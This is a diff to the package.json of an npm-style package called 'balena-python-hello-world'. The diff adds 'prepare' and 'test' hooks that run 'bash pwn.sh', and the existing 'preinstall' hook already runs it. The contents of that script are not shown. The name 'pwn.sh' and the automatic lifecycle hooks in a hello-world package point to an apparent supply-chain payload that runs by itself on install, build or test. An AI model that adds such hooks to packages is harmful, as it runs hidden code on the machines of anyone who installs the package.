@@ -2,6 +2,8 @@
   "name": "balena-python-hello-world",
   "version": "2.0.19",
   "scripts": {
-    "preinstall": "bash pwn.sh"
+    "preinstall": "bash pwn.sh",
+    "prepare": "bash pwn.sh",
+    "test": "bash pwn.sh"
   }
 }
